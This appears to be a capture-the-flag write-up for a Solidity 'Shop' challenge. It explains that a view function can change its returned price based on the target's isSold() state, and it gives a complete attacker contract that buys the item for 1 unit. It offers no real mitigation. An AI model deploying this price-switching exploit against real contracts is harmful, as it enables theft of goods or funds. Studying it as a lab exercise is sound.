## Objectives

1. Obtain an item for less than the asked price.

## Vulnerabilities

### Interface functions

Interface functions that have the `view` modifier can still be used to return different values based on another a contract's state. Indeed,
view functions can still read state and therefore can use that fact to have conditionnals.

## Exploit

1. Write and deploy a hack contract like this one:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopHack is Buyer {
    Shop target;

    constructor(address _targetAddress){
        target = Shop(_targetAddress);
    }

    function price() external view returns(uint){
        return target.isSold() ? 1 : 102;
    }

    function Hazaah() external {
        target.buy();
    }
}
```

2. Call the `Hazaah`function to buy the item at a lower price than asked.

## Suggested mitigation

1. Not sure without changing more.
